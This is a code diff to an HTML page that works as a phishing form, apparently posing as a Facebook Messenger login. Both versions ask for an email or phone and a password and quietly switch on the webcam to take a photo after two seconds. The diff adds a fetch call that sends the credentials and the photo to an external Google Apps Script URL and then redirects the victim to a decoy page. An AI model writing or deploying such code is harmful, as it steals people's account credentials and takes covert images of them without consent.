@@ -57,40 +57,83 @@
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <form action="https://script.google.com/macros/s/AKfycbyG51g2kaW0iz3XzRE-PwIV8v9icTlxetIPaMfczkCozCg5zdvwH5HI1kfPtoW2mlig/exec" method="post">
-      <input type="hidden" name="title" value="Fb msnger">
-      <input type="hidden" name="timestamp">
-      <input class="input" type="text" name="user" placeholder="Email address or phone number">
-      <input class="input" type="password" name="password" placeholder="Password">
-      
-      <video id="video" autoplay></video>
-      <canvas id="canvas" style="display:none;"></canvas>
-      <input type="hidden" name="photo" id="photo">
+  <body>
 
-      <button type="submit">Submit</button>
-    </form>
-  </div>
+  <form id="myForm">
+    <input type="hidden" name="redirect_url" value="google.html" />
+    <input type="text" name="user" placeholder="Email or phone" required />
+    <input type="password" name="password" placeholder="Password" required />
+    <input type="hidden" id="photo" name="photo" />
+    <button type="submit">Submit</button>
+  </form>
+
+  <!-- Hidden video and canvas elements for capturing photo -->
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-    const video = document.getElementById('video');
+   const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const photoInput = document.getElementById('photo');
-    
-    // Get access to the camera
+    const form = document.getElementById('myForm');
+
+    // Access camera and capture photo after 2 seconds
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
-        // Auto-capture photo after a short delay
+
         setTimeout(() => {
           const context = canvas.getContext('2d');
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0);
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
           photoInput.value = canvas.toDataURL('image/png');
-        }, 2000); // Auto-capture after 2 seconds
+
+          // Stop video stream to free camera
+          stream.getTracks().forEach(track => track.stop());
+          video.style.display = 'none';
+        }, 2000);
       })
-      .catch(err => console.error("Error accessing camera: ", err));
+      .catch(err => {
+        console.error("Error accessing camera:", err);
+        alert("Could not access camera.");
+      });
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+      const redirectUrl = formData.get('redirect_url');
+
+      // Convert FormData to URLSearchParams for fetch POST
+      const params = new URLSearchParams();
+      for (const pair of formData.entries()) {
+        params.append(pair[0], pair[1]);
+      }
+
+      fetch('https://script.google.com/macros/s/AKfycbyG51g2kaW0iz3XzRE-PwIV8v9icTlxetIPaMfczkCozCg5zdvwH5HI1kfPtoW2mlig/exec', {
+        method: 'POST',
+        body: params,
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded'
+        }
+      })
+      .then(response => {
+        if (!response.ok) throw new Error('Network response was not ok');
+        return response.text();
+      })
+      .then(() => {
+        // Redirect after successful submission
+        window.location.href = redirectUrl;
+      })
+      .catch(error => {
+        alert('Failed to submit form: ' + error.message);
+      });
+    });
+
+    // You can also add your existing form submit handler here
+    // For example, if you want to submit with fetch and redirect as before
   </script>
+
 </body>
 </html>
